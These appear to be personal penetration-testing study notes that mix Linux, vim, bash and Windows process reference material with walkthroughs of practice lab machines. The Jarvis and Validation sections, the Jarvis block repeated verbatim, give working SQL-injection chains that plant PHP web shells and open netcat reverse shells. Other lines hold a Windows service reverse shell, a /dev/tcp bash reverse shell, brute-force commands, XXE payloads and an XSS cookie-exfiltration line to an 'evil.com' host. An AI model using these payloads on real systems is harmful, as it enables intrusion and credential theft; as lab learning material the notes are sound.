/opt	Optional files such as third-party tools can be saved here.
/root	The home directory for the root user.
/sbin	This directory contains executables used for system administration (binary system files).
/tmp	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
/usr	Contains executables, libraries, man files, etc.
/var	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.

Working with Web Services
 For an Apache web server, we can use appropriate modules, which can encrypt the communication between browser and web server (mod_ssl), use as a proxy server (mod_proxy), or perform complex manipulations of HTTP header data (mod_headers) and URLs (mod_rewrite).

Navigation
  cd - //Jump back to the directory we were last in

Redirect STDIN Stream to a File
  We can also use the double lower-than characters (<<) to add our standard input through a stream. We can use the so-called End-Of-File (EOF) function of a Linux system file, which defines the input's end
  cat << EOF > stream.txt

An option for further locking down Linux systems is Security-Enhanced Linux (SELinux) or AppArmor. This is a kernel security module that can be used for security access control policies. In SELinux, every process, file, directory, and system object is given a label. Policy rules are created to control access between these labeled processes and objects and are enforced by the kernel. This means that access can be set up to control which users and applications can access which resources. SELinux provides very granular access controls, such as specifying who can append to a file or move it. Besides, there are different applications and services such as Snort, chkrootkit, rkhunter, Lynis, and others that can contribute to Linux's security.

Private browser setup
  firejail --private --dns=1.1.1.1 --dns=9.9.9.9 firefox -no-remote
  └──╼ $firejail --private=/home/m1l0js/work firefox --dns=1.1.1.1 --dns=9.9.9.9 -no-remote &

  a

Useful links
https://bashrcgenerator.com/
https://github.com/powerline/powerline
https://explainshell.com/


      



          
      


-=-=-
Portswigger
1.SQLi
show databases;
create database Twitch;
MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';



-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=

JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>

#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in       
        
            
        




          
        



      
      
          
      
      



          
      


-=-=-
Portswigger
1.SQLi
show databases;
create database Twitch;
MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';



-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=

JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>

#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 

database(), version() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name

-=-=-=-=-=-=-=-=
Validation machine ==> 
<h1>Hola</h1> (HTML injection vulnerable) //<script>alert("XSS")</script> (XSS vulnerable) ==> Let's how one of the parameters are send with burpsuite ==> burpsuite &> /dev/null & ==> SQLi ==> In the POST request username=suspicious&country=Brazil' union select version()-- - ==> username=suspicious&country=Brazil' union select "test"-- - //Test appears on the screen ==> username=suspicious&country=Brazil' union select schema_name from information_schema.schemata-- - ==> username=suspicious&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- - ==>
username=suspicious&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- - ==> username=suspicious&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- - //It does not work, let's try with into outfile ==> username=suspicious&country=Brazil' union select "loquesea" into outfile "/var/www/html/dog.txt"-- - ==>
username=baduser&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/test.php"-- -
//validation.py 
  pdb.set_trace()
    l
    p filename
    p main_url
//Another SQLi ==> static php cookie ==> ❯ echo -n 'm1l0js' | md5sum f49775f4b37981eb269a05abccba27cf ==> Use it in storage(developer tools)
//Use burpsuite in cmd parameter and urlencode the data

-=-=-=-=-=-
Return machine ==> 10.129.95.241
Open targetedXML with xsltproc ==> ❯ sudo xsltproc targetedXML > /var/www/html/index.html && service apache2 start ==> Perfect for Reports (LaTex) and so on.
whatweb http://10.129.95.241 -v ==> In http://10.129.95.241/settings.php change server address to your IP ==> 
Does this user belongs to the remote management users? 
Ways to privesc ==> net user svc-printer ==> Search in Google "Server operators microsoft" ==> Start and stop services ==> 
sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.37 443" //Send us a reverse shell 
PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.37 443"
sc.exe stop VMTools
(nc -nvlp 443)
sc.exe start VMTools

-=-=-=-=-=-=
Tentacle machine ==> 10.129.3.71
nvim /etc/hosts ==> 10.129.3.71 realcorp.htb srv01.realcorp.htb
dig @10.129.3.71 realcorp.htb
;; AUTHORITY SECTION:
realcorp.htb.           86400   IN      SOA     realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400

dig @10.129.3.71 realcorp.htb ns
;; ADDITIONAL SECTION:
ns.realcorp.htb.        259200  IN      A       10.197.243.77

vim /etc/proxychains.conf ==> http 10.129.3.71 3128
❯ dnsenum --dnsserver 10.129.3.71 --threads 20 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
Authentication in SSH with kerberos
apt install krb5-user OR dpkg-reconfigure krb5-config
knit j.nakasawa
klist 
kdestroy
.k5login
Privesc with pkexec 
	https://github.com/berdav/CVE-2021-4034














----------------------------------------------------------=================-----------------------
find
	-type d(only find directories) || f(find files)
	-name || -iname: Case insensitive
	-user: The username of the owner of a file
	-size: -n/+n/n can be used, where n is a number. To specify a size, you also need a sufix. c=bytes, k=KB and M=MBs. Example: If you want to specify a size less than 30 bytes, the argument -30c should be used
	-perm: To specify permissions.
		You can use - prefix to return files with at least the permissions you specify. This means that the -444 mode will match files that are readable by everyone, even if someone also has write and/or execute permissions.
		Using the / prefix will return files that match any of the permissions you have set. This means that the /666 mode will match files that are readable and writeable by at least one of the groups(owner,group or others)
	-a,m,c with min(for minutes) and time(days).
		-a:accesed
		-m:modified
		-c:changed
		Example:
		A file accesed more than 30 minutes ago: -amin +30
		Modified less than 7 days ago: -mtime -7
		A file modified within the last 24 hours: -mtime 0
	-exec: Example: -exec whoami \;

vim:
  :set shell=/bin/bash
  :shell


wget: Allows us to download files from the web via HTTP--as if you were accessing the file in your browser
SCP: Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption
	To copy an example file from our machine to a remote machine	scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
	To copy a file from a remote computer that we are not logged into:	scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
python3 -m http.server: One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use.
	And alternative is updog(pip3 install updog)
Viewing processes:
	ps aux: To see the processes run by other users and those that don't run from a session(i.e. system processes)
	top
	kill: Below are some of the signals that we can send to a process when it is killed
		SIGTERM: Kill the process, but allow it to do some cleanup tasks beforehand
		SIGKILL: Kill the process - doesn't do any cleanup after the fact
		SIGSTOP: Stop/suspend a process
	Once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what's known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process(although sharing the resources from systemd) to make it easier for us to identify and the likes.
	We can do four options with systemctl(This command allows us to interact with the systemd process/daemon)
		Start
		Stop
		Enable
		Disable
	When excuting things like scripts --rather than relying on the & operator, we can use ctrl + z on our keyboard to background a process.
	fg: To bring the background process back into use on the terminal, where the output of the script is now returned to use

crontabs: One of the processes that is started during boot, which is responsible for facilitating and managing cron jobs. It is simply a special file with formatting that is recognised by the cron. It requires 6 specific values:
	MIN: What minute to execute at
	HOUR: What hour to execute at
	DOM: What day of the month to execute at
	MON: What month of the year to execute at
	DOW: What day of the week to execute at
	CMD: The actual command that will be executed

	Example: 0 *12 * * * cp -R /home/andres/Documents /var/backups/
	crontab -e: Crontabs can be edited

package management:
	add-apt-repository. Whilst you can install software through the use of package installers such as dpkg. The benefits os apt means that whenever we update our system, the repository that contains the pieces of software that we add also gets checked for updates
	When adding software, the integrity of what we download is guaranteed by the use of what is called GPG(Gnu Privacy Guard) keys.
	Example:
		wget -qo - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
		A good practice is to have a separate file for every different community/3rd party repository that we add
			in /etc/apt/sources.list.d touch sublime-text.list
			nano sublime-text.list
			deb https://download.sublimetext.com/ apt/stable/
		apt update: After that, we need to update apt to recognise this new entry
		apt install sublime-text
		add-apt-repository --remove  and after apt remove sublime-text: To remove packages
Vim

	i: Insert at the beginning of the line
	A: Append to the final
        daw : delete the word under the cursor    
        caw : delete the word under the cursor and put you in insert mode
	dw: Until the start of the next word, EXCLUDING its first character
	de: To the end of the current word, INCLUDING the last character
	d$: Delete to the end of the line, INCLUDING the last character
	2w: Move the cursor two word forward
	3e: Move the cursor to the end of the third word forward
	0:  Move to the start of the line
	d2w: To delete the consecutive words
	dd: Delete a line
	2dd: Delete two lines
	u: Undo the last commands
	U: To fix a whole line
	r: To replace the character
	ce: To change until the end of a word
	c$: To change the rest of the line
	Ctrl G: Displays your location in the file
	G: To move you to the bottom of the file
	gg: To move you to the start of the file
	5G: To move to the line 5
	/: To search
		n: To search for the same prase again
		N: In the opposite direction
	?: To search for a phrase in the backward direction
		Ctrl o: To go back further
		Ctrl i: Goes forward
	%: Move the cursor to the other (,{ or {
	:s/old/new/g:To substitute 'new' for 'old'
		:#,#s/old/new/g: Where # are the line numbers of the range of lines where the substitution is to be done.
		:%s/old/new/gc: To find every occurrence in the whole file, with a prompt whether to substitute or not
	:!ls: Execute an external command
	:w TEST: Where TEST is the filename you chose
	:!del or rm: To remove
	v: Visual mode
	:r TEST: To retrieve the file and puts it below the cursor
	o: Open up a line BELOW the cursor and place you in Insert mode
	O: El contrario
	a: To append text AFTER the cursor
	a,i and A all go to the same Insert mode, the only difference is where
	R: To replace more than one character
	y: Copy text
	p: Paste it
	:set xxx: Where
		ic: ignorecase >> Ignore upper/lower case when searching
		is: incsearch >> Show partial matches for a search phrase
		hls: hlsearch >> Highlith all matching phrases
	Prepend no to switch an option off: :set noic

Regular expressions:
	[abc]: a,b,c (every occurrence of each letter)
	[abc]zz will match azz, bzz and czz. You can also use a - to define ranges:
		[a-c]zz is the same as above
	[a-cx-z]zz will match azz,bzz,czz,xzz,yzz and zzz
	[a-zA-Z] will match any single letter(lowercase or uppercase)
	file[1-3] will match file1,file2 and file3
	[^k]ing will match ring,sing,$ing but not king
	[^a-c]at will match fat and hat, but not bat or cat
	. is the wildcard that is used to match any single character(except the line break)
		a.c will match aac,abc,a0c,a!c and so on.
		a\.c: If you want to search for a literal dot
	? character optional.
		abc? will match ab and abc sinc de c is optional
	\d matches a digit, like 9
	\D matches a non-digit, like A or @
	\w matches an alphanumeric character, like a or 3. _ are included here.
	\W matches a non-alphanumeric character, like ! or #.
	\s matches a whitespace character (spaces, tabs, and line breaks)
	\S matches everything else (alphanumeric characters and symbols)
	{12} - exactly 12 times.
	{1,5} - 1 to 5 times.
	{2,} - 2 or more times.
	* - 0 or more times.
	+ - 1 or more times.

Bash scripting
https://tldp.org/LDP/abs/html/ #Advanced bash scripting
	#!/bin/bash
	set -x and set +x to debug code
	unset transport[1]: to remove an element in an array

#Example
if [ x ]; then
  docommand
elif [ y ]; then
  doothercommand
else
  dosomethingelse
fi

#Other
#!/bin/bash
for i in $( ls ); do
  echo item: $i
done

#Other with seq
#!/bin/bash
for i in `seq 1 10`;
do 
  echo $i
done

#While loop
while [condition]; do <command1>;<command2>;done

#Read line
while read line; do echo $line; done < file.txt


	-eq: Checks if the value of two operands are equal or not; if yes, then the condition becomes true.
	-ne: Checks if the value of two operands are equal or not; if values are not equal, then the condition becomes true.
	-gt: Checks if the value of left operand is greater than the value of right operand; if yes, then the condition becomes true.
	-lt: Checks if the value of left operand is less than the value of right operand; if yes, then the condition becomes true.
	-ge: Checks if the value of left operand is greater than or equal to the value of right operand; if yes, then the condition becomes true.
	-f: Checks if the file exists
	-w: Checks if the file is writable. Without write permissions we would not be able to output our text into the file
	read: To insert text

        curl -G: To change request methot to GET
        curl --proxy http://localhost:8080 : To use Burp
        cp /bin/bash /dev/shm/ajgs
          /dev/shm/ajgs -c '/dev/shm/ajgs -i >& /dev/tcp/10.10.14.47/4126 0>&1'


DNS:
nslookup --type=CNAME shop.website.thm
	Different types: A, AAAA, CNAME, MX and TXT among others.

Windows:
    C:\Windows\system32\cmd.exe
    path ==> Like in linux by separated through the ','
      First => built-in commands
      Second => PATH
    To list windows variables use 'set'
      echo %path% or echo %username%
    List files in a directory using for loop
      for %i in (*.*) do @echo FILE: %i #'@' is for hide the command prompt
    %windir%: The system  environment variable for the Windows directory
    lusrmgr.msc:  Local User and Group Management
        If you type 'other users' will redirect you to lusrmgr
    gpedit.msc : Local Group Policy Editor
    msconfig
        winver: Display Windows version information
        UserAccountControlSettings
        control.exe /name Microsoft.Troubleshooting
        control.exe system: View basic information about your computer system settings
        control /name Microsoft.WindowsUpdate
        compmgmt.msc: View and configure system settings and components
        msinfo32: View advanced information about hardware and software settings
        eventvwr.msc
        appwiz.cpl
        inetcpl.cpl: View internet properties
        cmd.exe /k %windir%\system32\ipconfig.exe
        perfmon: Monitor the performance of local or remote computers
        resmon: Monitor the performance and resource usage of the local computers
        taskmgr.exe /7
        regedt32.exe
        compmgmt: Administracion de equipos
        net
        wf.msc: Windows Firewall

    Event Viewer
        C:\windows\system32\winevt\logs
        wevtutil /el | Measure-Object : How many log names are in the machine
        wevtutil qe application /c:3 /rd:true /f:text : Count, reverse direction and format
        The Get-WinEvent cmdlet replaces the Get-EventLog cmdlet.
        Get-WinEvent -FilterHashtable @{logname='application'; ProviderName='WLMS'}
        Get-WinEvent -LogName application -FilterXPath 'Event/System/EventID=100': This queries start with '*' or 'Event'
        Get-WinEvent -logname application -FilterXPath 'Event/System/Provider[@Name="WLMS"] and Event/System/EventID=100'
        Get-WinEvent -logname security -FilterXPath 'Event/EventData/Data[@Name="TargetUserName"]="System"' -MaxEvents 5
        Get-WinEvent -path C:\Users\Administrator\Desktop\merged.evtx -FilterXPath 'Event/System/EventID=4104 and Event/EventData/Data[@Name="ScriptBlockText"]' -Oldest -MaxEvents 1 | Format-List
        Get-WinEvent -path C:\Users\Administrator\Desktop\merged.evtx -FilterXPath 'Event/System/EventID=4799'  -MaxEvents 2 | fl -Property *




    Core windows processes
        Tools better than taskmgr.exe: Process hacker and process explorer
        The first Windows process on the list is System. It was mentioned in a previous section that a PID for any given process is assigned at random, but that is not the case for the System process. The PID for System is always 4.
            What is unusual behavior for this process?
                A parent process (aside from System Idle Process (0))
                Multiple instances of System. (Should only be 1 instance)
                A different PID. (Remember that the PID will always be PID 4)
                Not running in Session 0
            The next process is smss.exe (Session Manager Subsystem). This process, also known as the Windows Session Manager, is responsible for creating new sessions. This is the first user-mode process started by the kernel.

            This process starts the kernel mode and user mode of the Windows subsystem (you can read more about the NT Architecture here). This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode).

            Smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions. This is done by smss.exe copying itself into the new session and self-terminating.
            What is unusual?

                A different parent process other than System(4)
                Image path is different from C:\Windows\System32
                More than 1 running process. (children self-terminate and exit after each new session)
                User is not SYSTEM
                Unexpected registry entries for Subsystem

            As mentioned in the previous section, csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If by chance this process is terminated it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance csrsrv.dll, basesrv.dll, and winsrv.dll are loaded (along with others).

            This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process masquerading as csrss.exe in plain sight
                User is not SYSTEM

            The Windows Initialization Process, wininit.exe, is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. This is another critical Windows process that runs in the background, along with its child processes.


            Note: lsaiso.exe is a process associated with Credential Guard and Key Guard. You will only see this process if Credential Guard is enabled.
            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The next process is the Service Control Manager (SCM), which is services.exe. Its primary responsibility is to handle system services: loading services, interacting with services, starting/ending services, etc. It maintains a database that can be queried using a Windows built-in utility, 'sc.exe.'


            Information regarding services is stored in the registry, HKLM\System\CurrentControlSet\Services.

            What is unusual?

                A parent process other than wininit.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The Service Host (Host Process for Windows Services), or svchost.exe, is responsible for hosting and managing Windows services

            What is unusual?

                A parent process other than services.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                The absence of the -k parameter


            "Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log."
            There are two types of access tokens:

              primary access tokens: those associated with a user account that are generated on log on
              impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

          For an impersonation token, there are different levels:

              SecurityAnonymous: current user/client cannot impersonate another user/client
              SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
              SecurityImpersonation: current user/client can impersonate the client's security context on the local system
              SecurityDelegation: current user/client can impersonate the client's security context on a remote system

          where the security context is a data structure that contains users' relevant security information.

          The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

              SeImpersonatePrivilege
              SeAssignPrimaryPrivilege
              SeTcbPrivilege
              SeBackupPrivilege
              SeRestorePrivilege
              SeCreateTokenPrivilege
              SeLoadDriverPrivilege
              SeTakeOwnershipPrivilege
              SeDebugPrivilege

            It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\System\CurrentControlSet\Control\Lsa.

            The Windows Logon, winlogon.exe, is responsible for handling the Secure Attention Sequence (SAS). This is the ALT+CTRL+DELETE key combination users press to enter their username & password.

            It is also responsible for locking the screen and running the user's screensaver, among other functions.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Not running as SYSTEM
                Shell value in the registry other than explorer.exe

            The last process we'll look at is the Windows Explorer, explorer.exe. This is the process that gives the user access to their folders and files. It also provides functionality to other features such as the Start Menu, Taskbar, etc.

            As mentioned previously, the Winlogon process runs userinit.exe, which launches the value in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. Userinit.exe exits after spawning explorer.exe. Because of this, the parent process is non-existent.

            What is unusual?

                An actual parent process. (userinit.exe calls this process and exits)
                Image file path other than C:\Windows
                Running as an unknown user
                Subtle misspellings to hide rogue process in plain sight
                Outbound TCP/IP connections


Network services
    SMB
        enum4linux
        -U             get userlist
        -M             get machine list
        -N             get namelist dump (different from -U and-M)
        -S             get sharelist
        -P             get password policy information
        -G             get group and member list
        -a             all of the above (full basic enumeration)
        -I             get about LDAP running on the server
        -i             printer information
        -n             nbmlookup

    smbclient
        -L list of shares  Ex: smbclient -L //10.10.0.50/ -U '' -N
        -U Username
        -P
        once inside:
        mput : Upload
            recurse to upload a specified folder ant its contents recursive
        mget: Download
    rpcclient 
      -U "" 10.10.32.51 -N  -c 'enumdomusers'
    telnet
        sudo tcpdump ip proto \\icmp -i tun0
        msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
    ftp
        hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

    SMTP
        msfconsole
            use 0
            options
            run
        hydra -t 16 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.230.202 ssh

    MySQL
        sudo apt install default-mysql-client
        mysql -h [IP] -u [username] -p
        msfconsole >> mysql_sql | mysql_schemadump | mysql_hashdump

cURL
    -X: Request type, eg -X POST
    --data: Which will default to plain text data.
    It does not store cookies and you have to manually specify any cookies and values that you would like to send with your request.
    Cookies are not shared between different browsers.
    curl -c - http://10.10.223.233:8081/ctf/getcookie : To see the cookie that you received
    curl -v --cookie "flagpls=flagpls" http://10.10.223.233:8081/ctf/sendcookie


SQLi
    https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt
    https://gchq.github.io/CyberChef/
    FlagAuthorised:True
    GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" : about/0 es para no retornar nada legitimo. group_concat es para recoger todos los elementos.
BURP
    <script>alert("Succ3ssful XSS")</script> : To probe an alert in JS
    Intruder: This quality makes Sniper very good for single-position attacks (e.g. a password bruteforce if we know the username or fuzzing for API endpoints).
    Battering Ram: Each item in our list of payloads gets put into every position for each request.
    Pitchfork: Pitchfork uses one payload set per position (up to a maximum of 20) and iterates through them all at once. If we have two lists, one with 100 lines and one with 90 lines, Intruder will only make 90 requests, and the final ten items in the first list will not get tested.


OWASP 10
    1-Injection:
        nc -e /bin/bash
        Linux
            whoami
            id
            ifconfig/ip addr
            uname -a
            ps -ef
            /etc/os-release or lsb_release -a

        Windows
            whoami
            ver
            ipconfig
            tasklist
            netstat -an
    2-Broken authentication
        register a user in a login page with some little changes like " darren" instead of "darren" who exists to gain the same privileges

    3-Sensitive Data Exposure
	sqlite3 to query a flat-file database
            .tables
            PRAGMA table_info(customers); //to see the table informatio

    4-XML External Entity
        Examples of XXE payload
            <!DOCTYPE replace [<!ENTITY name "feast"> ]>
             <userInfo>
              <firstName>falcon</firstName>
              <lastName>&name;</lastName>
             </userInfo>

            <?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
            <root>&read;</root>

    5-Broken Access Control
    6-Security Misconfiguration
    7-Cross-site Scripting
        Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
        Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
<!DOCTYPE html>
<html>
<head>
<title>This is the page title</title>
</head>
<body>
<h1>This is a Heading</h1>
<p>This is a paragraph.</p>
</body>
</html>
        XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
        Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

        <script>alert(window.location.hostname)</script>
        <script>document.querySelector('#thm-title').textContent = 'Hey'</script>
        #Exercise: <script>document.location='/log/'+document.cookie</script>
                   <img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '"
    There are three major types of XSS attacks:
      DOM (Special)
              DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
                <iframe src="javascript:alert(`xss`)">
      Persistent (Server-side)
              Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. 
              Once request captured, add a new header like this. True-Client-IP: <iframe src="javascript:alert(`xss`)">
      Reflected (Client-side)
              Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.



    To disable the browser built-in XSS protection
      Go to the URL bar, type about:config
      Search for browser.urlbar.filter.javascript
      Change the boolean value from True to False

    8- Insecure deserialization
    9-Components with known vulnerabilities
    10-Insufficient logging and monitoring
=============================================
Room: OwaspJuiceShop

1. SQLi
  {"email":"' or 1=1--","password":"no"}
  Why does this work?

      1.The character ' will close the brackets in the SQL query
      2.'OR' in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account. The 1=1 can be used when the email or username is not known or invalid
      3.The -- character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively

  {"email":"bender@juice-sh.op'--","password":"a"}

2. Broken Authentication
The § § is not two sperate inputs but rather Burp's implementation of quotations e.g. ""
hydra
